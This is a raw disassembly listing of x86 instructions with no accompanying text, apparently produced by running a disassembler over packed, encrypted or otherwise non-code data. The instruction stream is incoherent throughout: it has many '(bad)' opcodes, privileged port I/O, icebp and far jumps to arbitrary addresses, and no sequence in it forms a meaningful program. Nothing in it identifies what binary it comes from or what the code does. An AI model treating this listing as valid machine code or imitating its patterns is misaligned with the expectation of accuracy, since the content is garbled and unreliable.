  418f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f29:	mov    ch,dl
  418f2b:	jbe    0x418f9a
  418f2d:	ins    BYTE PTR es:[edi],dx
  418f2e:	aad    0x21
  418f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f31:	mov    BYTE PTR [edi],bl
  418f33:	out    0xc3,eax
  418f35:	xor    DWORD PTR [ebp-0x22],ebx
  418f38:	push   0xf570a5a8
  418f3d:	cdq    
  418f3e:	sti    
  418f3f:	push   cs
  418f40:	inc    ebx
  418f41:	out    dx,eax
  418f42:	add    al,0x17
  418f44:	stos   BYTE PTR es:[edi],al
  418f45:	mov    eax,0x3d74835d
  418f4a:	sub    edi,DWORD PTR [ebx+ebp*2+0x5880edc3]
  418f51:	dec    ebp
  418f52:	or     al,0x99
  418f54:	sub    BYTE PTR [eax-0x1e3a5afc],dl
  418f5a:	mov    esp,0x68e07d6f
  418f5f:	cmp    al,0x92
  418f61:	cmc    
  418f62:	sbb    eax,0xe57bdab6
  418f67:	inc    ecx
  418f68:	in     al,dx
  418f69:	dec    edx
  418f6a:	mov    dl,0x99
  418f6c:	jecxz  0x418f8b
  418f6e:	xor    ah,BYTE PTR [ecx]
  418f70:	lods   al,BYTE PTR ds:[esi]
  418f71:	mov    dl,0xe6
  418f73:	dec    esi
  418f74:	jns    0x418f87
  418f76:	sub    dl,BYTE PTR [ebx+0x12]
  418f79:	std    
  418f7a:	cmp    eax,DWORD PTR [ecx]
  418f7c:	jle    0x418f83
  418f7e:	xchg   edx,eax
  418f7f:	add    edx,DWORD PTR ds:0xd8a858c3
  418f85:	xchg   ebx,eax
  418f86:	jno    0x418f2a
  418f88:	call   0x21305bff
  418f8d:	jg     0x418fd6
  418f8f:	mov    bl,0x3b
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x19eaf1a7]
  419001:	inc    edi
  419002:	mov    esp,0x108eabb
  419007:	add    BYTE PTR ds:0x7f000001,al
  41900d:	enter  0x168d,0x71
  419011:	rcl    DWORD PTR [edi+edi*8+0x2c49b726],1
  419018:	out    dx,eax
  419019:	inc    ebx
  41901a:	and    ecx,DWORD PTR [edi-0x11ab3d82]
  419020:	jb     0x419071
  419022:	or     eax,0x10af236
  419027:	jmp    0x4e5de109
  41902c:	sbb    ch,BYTE PTR [esi]
  41902e:	mov    dl,0x50
  419030:	pushf  
  419031:	push   es
  419032:	fstp   TBYTE PTR [eax-0x68]
  419035:	sbb    edx,ebx
  419037:	(bad)  
  419038:	pushf  
  419039:	xlat   BYTE PTR ds:[ebx]
  41903a:	lods   al,BYTE PTR ds:[esi]
  41903b:	sbb    DWORD PTR [esi],edx
  41903d:	shl    BYTE PTR [ebp+0x6f],0x51
  419041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419042:	inc    esi
  419043:	out    dx,al
  419044:	lea    esp,[edx-0x5]
  419047:	sub    cl,BYTE PTR [ecx]
  419049:	fisttp QWORD PTR [ebx-0x1b]
  41904c:	or     edi,eax
  41904e:	ss inc esp
  419050:	xchg   esi,eax
  419051:	jbe    0x419009
  419053:	les    ebp,FWORD PTR [eax+0x27fd07e0]
  419059:	aaa    
  41905a:	cmp    DWORD PTR [edx-0x4a251266],ebx
  419060:	lods   al,BYTE PTR ds:[esi]
  419061:	pop    ebx
  419062:	out    dx,eax
  419063:	push   edi
  419064:	push   ebp
  419065:	pop    edi
  419066:	inc    eax
  419067:	mov    dh,0xe8
  419069:	fiadd  WORD PTR [ebp-0x55]
  41906c:	jle    0x4190c4
  41906e:	xchg   esi,eax
  41906f:	mov    ds:0xa6c4eb19,al
  419074:	enter  0x52d0,0x31
  419078:	push   0x74
  41907a:	sub    DWORD PTR [edx+0x68],edi
  41907d:	fldcw  WORD PTR [edx]
  41907f:	clc    
  419080:	mov    BYTE PTR [ebp+0x7f44e3e2],ch
  419086:	inc    esp
  419087:	out    dx,eax
  419088:	in     al,0x21
  41908a:	jg     0x4190e8
  41908c:	push   ebx
  41908d:	fwait
  41908e:	xor    eax,DWORD PTR [edx]
  419090:	dec    ecx
  419091:	icebp  
  419092:	fmul   QWORD PTR [edi]
  419094:	(bad)  
  419095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419096:	sbb    ebx,eax
  419098:	sbb    bh,0x9
  41909b:	addr16 cmp al,0x5a
  41909e:	xor    edx,DWORD PTR [ebx+esi*2-0x1889a98f]
  4190a5:	popf   
  4190a6:	nop
  4190a7:	outs   dx,BYTE PTR ds:[esi]
  4190a8:	aaa    
  4190a9:	(bad)  
  4190ab:	in     al,dx
  4190ac:	addr16 cwde 
  4190ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190af:	dec    esi
  4190b0:	bound  edi,QWORD PTR [edi+0x42]
  4190b3:	xchg   ecx,eax
  4190b4:	clc    
  4190b5:	retf   
  4190b6:	in     eax,dx
  4190b7:	sub    eax,0xa9b84259
  4190bc:	push   esp
  4190bd:	cmp    DWORD PTR [ebp+0x2d928c0a],esi
  4190c3:	mov    ch,0xc6
  4190c5:	or     dl,BYTE PTR [ebp-0x3a6491]
  4190cb:	sbb    DWORD PTR [esp+ebp*2-0x32],esi
  4190cf:	jp     0x41914e
  4190d1:	xchg   edx,eax
  4190d2:	xchg   ebp,eax
  4190d3:	arpl   WORD PTR [esi-0x32],di
  4190d6:	(bad)  
  4190d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190d9:	scas   al,BYTE PTR es:[edi]
  4190da:	cmp    BYTE PTR [edi+0x50abf43b],dl
  4190e0:	or     eax,0x638cb2ac
  4190e5:	mov    bh,0xcd
  4190e7:	mov    edx,0x5e9b5601
  4190ec:	push   esi
  4190ed:	or     BYTE PTR [esp+eax*1-0x46],ah
  4190f1:	jge    0x41915d
  4190f3:	push   eax
  4190f4:	icebp  
  4190f5:	jp     0x41912d
  4190f7:	dec    ebx
  4190f8:	jmp    0xde8d:0x43419b80
  4190ff:	push   di
  419101:	adc    bl,BYTE PTR [ebp+0x6241dabb]
  419107:	cmp    esp,DWORD PTR [esi+ebp*4+0x63d9935c]
  41910e:	and    cl,0xc3
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,ch
  419181:	or     BYTE PTR [esi+0x109efd2],ah
  419187:	add    BYTE PTR ds:0x29000001,al
  41918d:	enter  0xab16,0x51
  419191:	call   0xb5baa39
  419196:	int3   
  419197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419198:	pop    edi
  419199:	lahf   
  41919a:	rol    BYTE PTR cs:[eax+0x62c66194],0xba
  4191a2:	push   edi
  4191a3:	fwait
  4191a4:	fs push si
  4191a7:	dec    edx
  4191a8:	shr    dh,0xad
  4191ab:	addr16 mov ds:0x93dc,al
  4191af:	pop    ss
  4191b0:	dec    eax
  4191b1:	pop    ebx
  4191b2:	out    dx,al
  4191b3:	sbb    al,0xb
  4191b5:	push   edi
  4191b6:	adc    BYTE PTR [edx],ch
  4191b8:	(bad)
  4191bc:	stos   DWORD PTR es:[edi],eax
  4191bd:	adc    BYTE PTR [ebx+edx*2],bh
  4191c0:	das    
  4191c1:	int3   
  4191c2:	cmc    
  4191c3:	jmp    0xf08e:0x8a754ef3
  4191ca:	rol    DWORD PTR ds:0xf23ae94c,cl
  4191d0:	outs   dx,BYTE PTR ds:[esi]
  4191d1:	jmp    0x2a405468
  4191d6:	and    BYTE PTR [ecx-0x2],dh
  4191d9:	mov    ebp,0x3a160b27
  4191de:	or     al,0xe5
  4191e0:	int3   
  4191e1:	or     esp,DWORD PTR [ebp+0x6b]
  4191e4:	mov    eax,ds:0xe1639c0c
  4191e9:	push   ebx
  4191ea:	xor    eax,0x88f9b195
  4191ef:	addr16 mov esp,0xb990aa98
  4191f5:	test   BYTE PTR [ecx+0x43a4cd00],dh
  4191fb:	and    cl,BYTE PTR [ebx+0x5cd512dc]
  419201:	and    bh,ah
  419203:	mov    ah,0x75
  419205:	fisubr WORD PTR [ecx-0x33]
  419208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419209:	and    edx,DWORD PTR [ebx+0x46]
  41920c:	inc    esi
  41920d:	icebp  
  41920e:	or     ah,BYTE PTR [eax+0x10]
  419211:	sets   ah
  419214:	push   edx
  419215:	inc    ecx
  419216:	fist   WORD PTR [edx]
  419218:	and    al,0x77
  41921a:	ds xchg ebp,eax
  41921c:	adc    ch,ah
  41921e:	xchg   ebp,eax
  41921f:	dec    ebx
  419220:	shl    BYTE PTR [esi+0x69ed605a],1
  419226:	xor    al,0xe8
  419228:	xor    eax,0xbc748181
  41922d:	fidivr DWORD PTR [ecx+0x47918027]
  419233:	fisub  WORD PTR [ecx+0x5c76296a]
  419239:	pop    edi
  41923a:	(bad)  
  41923b:	repz aaa 
  41923d:	sbb    eax,0x92036ec7
  419242:	mov    DWORD PTR [ecx+ebp*1],edi
  419245:	jecxz  0x419208
  419247:	mov    cl,dh
  419249:	sti    
  41924a:	inc    edx
  41924b:	mov    dh,0x7b
  41924d:	dec    eax
  41924e:	xchg   esp,eax
  41924f:	add    DWORD PTR [eax+0x69a63c09],eax
  419255:	jne    0x35ea8081
  41925b:	mov    DWORD PTR [ebx+0x3c0d00],esi
  419261:	push   ebx
  419262:	xor    bl,dl
  419264:	adc    ecx,DWORD PTR [edx-0x1331caf0]
  41926a:	ret    0xd15f
  41926d:	sub    eax,0xcaa674ce
  419272:	sub    dl,bh
  419274:	cmp    eax,0xede56f42
  419279:	jecxz  0x41921f
  41927b:	icebp  
  41927c:	jl     0x4192c7
  41927e:	jmp    0x41926a
  419280:	ins    BYTE PTR es:[edi],dx
  419281:	push   ss
  419282:	push   ss
  419283:	and    eax,0x37a5b395
  419288:	jecxz  0x419302
  41928a:	adc    BYTE PTR [edi+0x57ee26fa],cl
  419290:	and    eax,DWORD PTR [eax]
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	adc    esi,0xaf4e268
  419306:	add    DWORD PTR [eax],eax
  419308:	add    eax,0x2a000001
  41930d:	lock mov es,edi
  419310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419311:	add    al,0x9b
  419313:	loop   0x41937a
  419315:	pop    ecx
  419316:	inc    eax
  419317:	ins    DWORD PTR es:[edi],dx
  419318:	inc    edx
  419319:	inc    esp
  41931a:	mov    eax,0x4f58f920
  41931f:	sbb    eax,0x47e0659
  419324:	jae    0x419311
  419326:	cld    
  419327:	inc    ebp
  419328:	stc    
  419329:	into   
  41932a:	stos   DWORD PTR es:[edi],eax
  41932b:	cdq    
  41932c:	jl     0x4192ce
  41932e:	arpl   WORD PTR [esi],sp
  419330:	push   edi
  419331:	fs jecxz 0x419394
  419334:	cmp    al,0x3e
  419336:	test   eax,0xd21bb3a8
  41933b:	or     al,0x84
  41933d:	div    DWORD PTR [ebx]
  41933f:	imul   esp,DWORD PTR [esi],0xffffffaa
  419342:	add    DWORD PTR [ecx+eiz*1+0x6a970266],edx
  419349:	adc    ecx,0xffffffa5
  41934c:	int3   
  41934d:	fldenv [bx+si+0x357e]
  419353:	mov    ebx,0xd8b4ce8a
  419358:	inc    ebp
  419359:	or     cl,bl
  41935b:	nop
  41935c:	fldcw  WORD PTR [ecx-0x60]
  41935f:	faddp  st(0),st
  419361:	ret    
  419362:	push   edx
  419363:	add    al,0xb
  419365:	jae    0x41933f
  419367:	mov    ebp,DWORD PTR ss:[ecx]
  41936a:	mov    dh,0x6c
  41936c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936d:	push   ebx
  41936e:	(bad)  [eax+0x19]
  419371:	loopne 0x419318
  419373:	add    cl,BYTE PTR [eax+0x3a1b6343]
  419379:	repnz xlat BYTE PTR ds:[bx]
  41937c:	jmp    DWORD PTR [eax]
  41937e:	std    
  41937f:	test   WORD PTR [esi],di
  419382:	sar    BYTE PTR ds:0xe907c936,cl
  419388:	push   esi
  419389:	add    edx,ebx
  41938b:	nop
  41938c:	push   0x52
  41938e:	add    ebx,DWORD PTR [ecx+0x4a]
  419391:	aaa    
  419392:	stos   BYTE PTR es:[edi],al
  419393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419394:	mov    edi,0x24044620
  419399:	xchg   edx,eax
  41939a:	adc    BYTE PTR ds:0x96d61eb5,0x4d
  4193a1:	dec    ecx
  4193a2:	mov    edx,0xd71197e0
  4193a7:	in     al,0xcc
  4193a9:	inc    ecx
  4193aa:	pop    ecx
  4193ab:	(bad)  
  4193ac:	in     al,dx
  4193ad:	add    al,0xeb
  4193af:	mov    bl,0xc6
  4193b1:	fst    DWORD PTR [ebp-0x3b]
  4193b4:	retf   
  4193b5:	shrd   DWORD PTR [ebp+0x2d],ecx,cl
  4193b9:	and    DWORD PTR [esi+0x57],0xa75631b5
  4193c0:	jp     0x4193d7
  4193c2:	fdivr  DWORD PTR es:[edx]
  4193c5:	jno    0x419416
  4193c7:	xor    DWORD PTR [ebx+0x55],ebp
  4193ca:	imul   edx,ecx,0x6951cd1
  4193d0:	imul   edx,DWORD PTR [esi+0x6c],0x16451f07
  4193d7:	and    DWORD PTR [ecx-0x20f8b55d],ecx
  4193dd:	mov    esi,0x2da8a90
  4193e2:	mov    dh,BYTE PTR [esi+eiz*1-0x58]
  4193e6:	in     al,dx
  4193e7:	and    al,BYTE PTR [edx+0x733e40a]
  4193ed:	jbe    0x41938b
  4193ef:	int3   
  4193f0:	ret    
  4193f1:	and    dl,bl
  4193f3:	sub    ah,dl
  4193f5:	repz pop ebx
  4193f7:	fsubr  st,st(2)
  4193f9:	retf   0xc66c
  4193fc:	jmp    0xb9b3:0x6ef115a3
  419403:	mov    cl,0x40
  419405:	inc    ebx
  419406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419407:	fwait
  419408:	test   DWORD PTR [ebx+eiz*1-0x2f281ff0],ebp
  41940f:	daa    
  419410:	nop
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	xchg   BYTE PTR [esi+0xbf965e1],bl
  419486:	add    DWORD PTR [eax],eax
  419488:	add    eax,0x19000001
  41948d:	xchg   eax,esp
  41948f:	xchg   edi,eax
  419490:	test   BYTE PTR [esi],dl
  419492:	jne    0x41947b
  419494:	mov    edx,0xb016b15b
  419499:	pop    esp
  41949a:	cmc    
  41949b:	inc    eax
  41949c:	aas    
  41949d:	stc    
  41949e:	enter  0x2e7a,0x2e
  4194a2:	mov    dl,bh
  4194a4:	add    al,0xb8
  4194a7:	icebp  
  4194a8:	aad    0xfe
  4194aa:	mov    esp,0xc9190cc6
  4194af:	pop    edi
  4194b0:	hlt    
  4194b1:	jne    0x419452
  4194b3:	xchg   edx,eax
  4194b4:	mov    WORD PTR [edi+0x5f],?
  4194b7:	push   edx
  4194b8:	lock js 0x4194ab
  4194bb:	mov    ebp,0x9243d60
  4194c0:	inc    ebx
  4194c1:	adc    eax,0x9dbe9416
  4194c6:	cmp    ebx,DWORD PTR [ecx+0x33]
  4194c9:	test   eax,0x5f4622d0
  4194ce:	mov    ecx,0x95eb2c4e
  4194d3:	mov    ds:0xcc62d72c,eax
  4194d8:	(bad)  
  4194d9:	dec    esp
  4194da:	cmp    BYTE PTR [esp+ebx*8+0x2c],0xfe
  4194df:	ds mov cl,0x8c
  4194e2:	repnz leave 
  4194e4:	pop    eax
  4194e5:	dec    DWORD PTR [ebp-0x208ec581]
  4194eb:	retf   0x72ea
  4194ee:	push   ebp
  4194ef:	jle    0x4194b2
  4194f1:	rcr    DWORD PTR [esi+esi*1+0x68ee606a],1
  4194f8:	cmp    bl,BYTE PTR [ebp-0x1bf66101]
  4194fe:	dec    eax
  4194ff:	es mov dh,0x52
  419502:	sbb    eax,0xf3ed7b7d
  419507:	lods   al,BYTE PTR ds:[esi]
  419508:	xchg   edi,eax
  419509:	mov    dl,ah
  41950b:	xchg   esp,eax
  41950c:	and    al,0xd
  41950e:	sub    DWORD PTR [esi],ebp
  419510:	inc    esp
  419511:	int3   
  419512:	and    BYTE PTR [edx+0x17],bh
  419515:	in     eax,0xa1
  419517:	dec    eax
  419518:	test   BYTE PTR [ecx],dl
  41951a:	and    BYTE PTR [ecx],dh
  41951c:	sub    edi,DWORD PTR [edi+ecx*4]
  41951f:	scas   eax,DWORD PTR es:[edi]
  419520:	sti    
  419521:	cmp    ecx,DWORD PTR [ebx-0x6a]
  419524:	call   0xa6f401ee
  419529:	std    
  41952a:	adc    al,0x18
  41952c:	test   eax,0x817b8672
  419531:	xor    al,0x18
  419533:	jo     0x4194c2
  419535:	mov    dh,0x96
  419537:	in     eax,dx
  419538:	ins    BYTE PTR es:[edi],dx
  419539:	cmp    ebx,DWORD PTR [edx-0x15]
  41953c:	xchg   edi,eax
  41953d:	mov    dl,0xd0
  41953f:	cmovne ebx,DWORD PTR [ebp+0x3e]
  419543:	mov    al,0x41
  419545:	dec    ebx
  419546:	add    esp,DWORD PTR [ebx+0x7f17736b]
  41954c:	cld    
  41954d:	pop    es
  41954e:	mov    cl,0x9d
  419550:	mov    al,dl
  419552:	push   0x2dc74905
  419557:	cmp    cl,BYTE PTR [ebx]
  419559:	daa    
  41955a:	aam    0x56
  41955c:	in     eax,0xf3
  41955e:	or     ebp,esp
  419560:	fcmovbe st,st(0)
  419562:	mov    ebx,eax
  419564:	inc    ecx
  419565:	(bad)  
  419568:	xchg   ecx,eax
  419569:	cmc    
  41956a:	test   DWORD PTR [ebx-0x434706a2],edx
  419570:	mov    dh,0xa9
  419572:	add    DWORD PTR [eax],ebx
  419574:	or     dh,0x6b
  419577:	or     BYTE PTR [edx],cl
  419579:	sti    
  41957a:	jo     0x41956c
  41957c:	mov    BYTE PTR [eax],ch
  41957e:	imul   edx,DWORD PTR [ebx],0xe1c72a0a
  419584:	inc    ebx
  419585:	inc    esp
  419586:	jae    0x4195cd
  419588:	icebp  
  419589:	or     ah,cl
  41958b:	loope  0x41959b
  41958d:	push   esi
  41958e:	(bad)
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	jns    0x4195c0
  419602:	test   DWORD PTR [edi-0x2],0x500010c
  419609:	add    DWORD PTR [eax],eax
  41960b:	add    ch,dl
  41960d:	popf   
  41960e:	mov    ebp,0x5e05afcc
  419613:	dec    esp
  419614:	dec    esi
  419615:	scas   al,BYTE PTR es:[edi]
  419616:	dec    edx
  419617:	fldcw  WORD PTR [eax-0x6ec0f563]
  41961d:	push   esi
  41961e:	ror    DWORD PTR [eax],1
  419620:	dec    eax
  419621:	push   ebp
  419622:	out    0x97,al
  419624:	imul   esi,DWORD PTR [edx-0x3f],0xffffffc9
  419628:	inc    ecx
  419629:	mov    bl,0x68
  41962b:	mov    ds:0x8e8b2440,eax
  419630:	jle    0x4195c8
  419632:	mov    ds:0x481ca0eb,al
  419637:	bound  ecx,QWORD PTR ds:0xf98ecc2b
  41963d:	xlat   BYTE PTR ds:[ebx]
  41963e:	cmp    eax,0x20fe44dd
  419643:	or     dl,cl
  419645:	mov    eax,0xcd285e3b
  41964a:	out    0xa5,al
  41964c:	mov    ebx,0xcb09c0dd
  419651:	mov    ds:0x618d9f83,al
  419656:	and    esp,DWORD PTR [ecx+0x5d9bd336]
  41965c:	pop    eax
  41965d:	mov    ch,0xc6
  41965f:	xchg   edi,eax
  419660:	cmp    DWORD PTR [ebp+0xcc0317d],ebx
  419666:	pop    eax
  419667:	sbb    DWORD PTR [ebp+0x38779731],esp
  41966d:	in     al,0xd4
  41966f:	je     0x4196ce
  419671:	std    
  419672:	xchg   ecx,eax
  419673:	retf   
  419674:	mov    cl,0x53
  419676:	inc    ecx
  419677:	push   0xffffff93
  419679:	mov    bh,0x2e
  41967b:	jns    0x419625
  41967d:	pop    ss
  41967e:	mov    bl,0x2
  419680:	imul   esi,DWORD PTR [ebx-0xd82bff5],0xf8e85c9d
  41968a:	repz loop 0x41966a
  41968d:	mov    ds:0xf9ace3ee,eax
  419692:	dec    ebp
  419693:	sbb    bl,BYTE PTR [edi+0x5fa3e5a4]
  419699:	sbb    al,BYTE PTR [edi]
  41969b:	dec    ecx
  41969c:	push   ss
  41969d:	xchg   edx,eax
  41969e:	fimul  WORD PTR [esp+eax*4]
  4196a1:	and    bl,BYTE PTR [ebx-0x1b009d2f]
  4196a7:	lock lods al,BYTE PTR ds:[esi]
  4196a9:	sti    
  4196aa:	inc    esp
  4196ab:	xor    eax,0x6dfbebc
  4196b0:	(bad)  
  4196b1:	inc    eax
  4196b2:	pusha  
  4196b3:	jne    0x4196a5
  4196b5:	stc    
  4196b6:	fild   WORD PTR [edx]
  4196b8:	sub    DWORD PTR gs:[ebx],0x8e281261
  4196bf:	icebp  
  4196c0:	test   eax,0x49542845
  4196c5:	out    0x4a,eax
  4196c7:	mov    dl,0x6
  4196c9:	mov    ebx,0x28e00064
  4196ce:	not    BYTE PTR [eax+0x4f946b99]
  4196d4:	cmp    BYTE PTR [ecx],bl
  4196d6:	add    DWORD PTR [eax-0x389a3c79],edi
  4196dc:	mov    dh,0x4a
  4196de:	sbb    DWORD PTR [edx],0xfceae073
  4196e4:	out    dx,eax
  4196e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196e6:	loopne 0x4196c7
  4196e8:	cwde   
  4196e9:	fwait
  4196ea:	pop    eax
  4196eb:	adc    ch,BYTE PTR [ecx]
  4196ed:	sub    BYTE PTR [ecx],dh
  4196ef:	xor    BYTE PTR [ebp+0x12],ah
  4196f2:	into   
  4196f3:	push   edi
  4196f4:	sub    BYTE PTR [edx],dh
  4196f6:	mov    edi,0xf97479ca
  4196fb:	fidiv  DWORD PTR ds:0xa301f818
  419701:	pop    ebp
  419702:	mov    ds:0x7c66e3f4,eax
  419707:	ins    BYTE PTR es:[edi],dx
  419708:	jbe    0x41971b
  41970a:	push   eax
  41970b:	test   DWORD PTR [ecx+eiz*8+0x2e],eax
  41970f:	or     DWORD PTR [ebp+0x0],esp
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x628dd0ae
  419781:	and    BYTE PTR [edx],ch
  419783:	out    0x3,al
  419785:	push   cs
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0xb000001
  41978d:	xchg   ebx,eax
  41978e:	mov    ebp,0x5ea96d81
  419793:	jmp    0x419762
  419795:	and    BYTE PTR [edi-0x80],ah
  419798:	mul    BYTE PTR [edx]
  41979a:	jns    0x419814
  41979c:	add    DWORD PTR [ebp+0x102e3393],ecx
  4197a2:	mov    ds:0x652603e8,eax
  4197a7:	stc    
  4197a8:	ret    
  4197a9:	cs test esp,ebx
  4197ac:	scas   eax,DWORD PTR es:[edi]
  4197ad:	xchg   edi,eax
  4197ae:	mov    eax,0x169a014b
  4197b3:	adc    al,0xd5
  4197b5:	or     DWORD PTR [esi-0x28],ebp
  4197b8:	sbb    BYTE PTR [eax],0xc5
  4197bb:	jp     0x4197dd
  4197bd:	push   ss
  4197be:	mov    es,WORD PTR [ebx+0x460911a2]
  4197c4:	das    
  4197c5:	push   ebp
  4197c6:	push   ds
  4197c7:	pop    esi
  4197c8:	push   esi
  4197c9:	pop    esi
  4197ca:	hlt    
  4197cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197cc:	dec    edi
  4197cd:	adc    al,0xd4
  4197cf:	iret   
  4197d0:	xchg   ebx,eax
  4197d1:	sub    al,0x53
  4197d3:	leave  
  4197d4:	adc    DWORD PTR [eax+0x2b],edi
  4197d7:	pop    eax
  4197d8:	out    dx,al
  4197d9:	das    
  4197da:	push   ebx
  4197db:	mov    ds:0x440c1212,al
  4197e0:	jae    0x41981e
  4197e2:	pop    ebx
  4197e3:	pop    ecx
  4197e4:	pop    edx
  4197e5:	cs (bad) 
  4197e7:	jae    0x4197aa
  4197e9:	clc    
  4197ea:	add    DWORD PTR [edi+0x693eb3bd],ecx
  4197f0:	or     eax,0x7c4de75b
  4197f5:	cmp    al,0x81
  4197f7:	loopne 0x4197ef
  4197f9:	ds popf 
  4197fb:	aaa    
  4197fc:	jle    0x4197e5
  4197fe:	test   al,0x83
  419800:	loop   0x419868
  419802:	fwait
  419803:	(bad)  
  419804:	in     al,0x4b
  419806:	or     ebp,DWORD PTR [esi-0x682ab640]
  41980c:	jle    0x419861
  41980e:	mov    bl,ch
  419810:	adc    al,dh
  419812:	pop    ds
  419813:	add    BYTE PTR [edx],0x86
  419816:	jnp    0x419805
  419818:	xchg   ebx,eax
  419819:	push   ecx
  41981a:	jb     0xe62bc457
  419820:	add    DWORD PTR [ebx+0x7046967e],ecx
  419826:	fadd   QWORD PTR [eax+0x41cfcae5]
  41982c:	mov    dl,0x6
  41982e:	inc    esp
  41982f:	mov    eax,0xf3b25938
  419834:	fwait
  419835:	add    eax,DWORD PTR [ecx]
  419837:	jl     0x4198a5
  419839:	or     dh,BYTE PTR [edi+0x566cb54e]
  41983f:	adc    BYTE PTR [ebx+eax*4],dh
  419842:	or     al,0x2b
  419844:	jns    0x419832
  419846:	push   ecx
  419847:	and    al,0x4e
  419849:	js     0x419830
  41984b:	inc    esp
  41984c:	cwde   
  41984d:	pop    edi
  41984e:	xor    al,0x2a
  419850:	shl    edi,0xf3
  419853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419854:	push   edx
  419855:	aas    
  419856:	dec    edx
  419857:	add    edi,esp
  419859:	test   eax,0x2eba276f
  41985e:	add    DWORD PTR [ecx-0x61],ebp
  419861:	dec    ecx
  419862:	call   0x5212b206
  419867:	rcl    DWORD PTR [ebx],1
  419869:	(bad)  
  41986a:	fisttp DWORD PTR [esi+0x13]
  41986d:	cmp    ecx,eax
  41986f:	shl    DWORD PTR [ecx+0x462ffb9c],1
  419875:	add    ah,cl
  419877:	jb     0x41986c
  419879:	or     edi,DWORD PTR [ebx+eax*2-0x50]
  41987d:	mov    cl,0xc9
  41987f:	sbb    cl,ch
  419881:	pop    ebx
  419882:	dec    esi
  419883:	cs stc 
  419885:	test   BYTE PTR [edx],bh
  419887:	sub    al,0xb4
  419889:	leave  
  41988a:	movlps QWORD PTR [bx+si+0x7b],xmm7
  41988f:	(bad)  
  419890:	outs   dx,BYTE PTR ds:[esi]
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fisttp QWORD PTR [ecx+0x8d26593]
  419905:	sgdtd  [eax]
  419908:	add    eax,0xa3000001
  41990d:	ins    DWORD PTR es:[edi],dx
  41990e:	xor    eax,DWORD PTR [esi+0x10]
  419911:	sub    al,BYTE PTR [esi]
  419913:	bound  esp,QWORD PTR [edx-0x48920f1]
  419919:	jg     0x419996
  41991b:	cdq    
  41991c:	cmp    al,0x79
  41991e:	xchg   edi,eax
  41991f:	push   0x46555b75
  419924:	add    al,0xb
  419926:	inc    eax
  419927:	xor    ebp,DWORD PTR [ebp+0x1c9b78b3]
  41992d:	(bad)  
  41992e:	mov    WORD PTR [edx+eax*4+0xcc2d905],gs
  419935:	cdq    
  419936:	push   esp
  419937:	mov    esi,0xb4dbf2e8
  41993c:	or     al,0x70
  41993e:	xchg   edi,eax
  41993f:	mov    ebp,0x9ea5acb0
  419944:	stc    
  419945:	sub    BYTE PTR [ebx+0x16],dh
  419948:	mov    al,ds:0xa8c6afaf
  41994d:	stos   BYTE PTR es:[edi],al
  41994e:	xor    ebp,DWORD PTR [edx]
  419950:	cmp    ah,al
  419952:	ss idiv edx
  419955:	jne    0x4199b9
  419957:	ret    
  419958:	pop    ss
  419959:	fs loop 0x41998b
  41995c:	retf   0x1477
  41995f:	mov    dl,0xdb
  419961:	pop    edi
  419962:	pop    ebx
  419963:	cld    
  419964:	(bad)  
  419965:	sub    eax,0xdbfaa83e
  41996a:	stos   DWORD PTR es:[edi],eax
  41996b:	push   es
  41996c:	inc    ebx
  41996d:	mov    ecx,0x66bb9d46
  419972:	push   ecx
  419973:	test   BYTE PTR [esi+0x4b],0xb6
  419977:	mov    eax,ds:0xdfaa42d4
  41997c:	aam    0xb5
  41997e:	ret    0xdfe7
  419981:	popf   
  419982:	dec    ebp
  419983:	out    0x55,al
  419985:	fbld   TBYTE PTR [edx]
  419987:	push   esi
  419988:	ins    BYTE PTR es:[edi],dx
  419989:	jns    0x41996b
  41998b:	scas   eax,DWORD PTR es:[edi]
  41998c:	pop    edi
  41998d:	imul   edx,DWORD PTR [esi-0x6d],0xe6874493
  419994:	and    BYTE PTR [eax+0x372ebd3c],0xd3
  41999b:	into   
  41999c:	fimul  WORD PTR [edi-0x21]
  41999f:	hlt    
  4199a0:	and    eax,0x7e517e00
  4199a5:	push   ds
